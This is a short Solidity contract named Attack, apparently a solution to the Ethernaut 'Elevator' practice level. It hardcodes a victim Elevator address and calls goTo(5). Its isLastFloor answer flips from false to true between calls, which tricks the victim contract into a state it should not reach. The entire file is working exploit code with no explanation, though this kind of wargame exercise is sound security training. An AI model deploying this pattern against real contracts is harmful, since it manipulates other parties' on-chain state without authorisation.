// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Attack{
    bool firstCall = true;
    // put your instance here
    Elevator victim = Elevator(0x8c0fA1979ce7884196e0Dd31608aC141e70f86d0);
    function getGoTo() external returns (bool){
        victim.goTo(5);
        return true;
    }

    function isLastFloor(uint _floor) external returns (bool){
        if(firstCall){
          firstCall = false;
          return false;
        }
        else
          return true;
    }
}